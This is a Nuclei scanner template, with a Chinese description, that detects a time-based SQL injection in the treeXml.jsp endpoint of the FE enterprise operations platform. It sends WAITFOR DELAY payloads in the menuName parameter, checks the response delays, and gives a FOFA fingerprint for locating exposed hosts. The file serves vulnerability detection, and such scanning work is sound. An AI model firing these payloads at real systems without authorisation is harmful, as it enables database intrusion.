http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=5 && duration_1<=6
            - duration_2>=9 && duration_2<=10
          type: dsl
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - "GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:5'--&type=function HTTP/1.1 \nHost: {{Hostname}}\n"
        - "GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:9'--&type=function HTTP/1.1 \nHost: {{Hostname}}\n"
id: FE-treeXml-sql-injection
info:
    author: Superhero
    description: |-
        fofa: app="FE-协作平台"
        飞企互联-FE企业运营管理平台 treeXmljsp 接口存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
    name: 飞企互联-FE企业运营管理平台 treeXml.jsp SQL延时注入漏洞
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/139577101
    severity: high
    tags:
        - FE企业运营管理平台
        - 飞企互联-FE企业运营管理平台
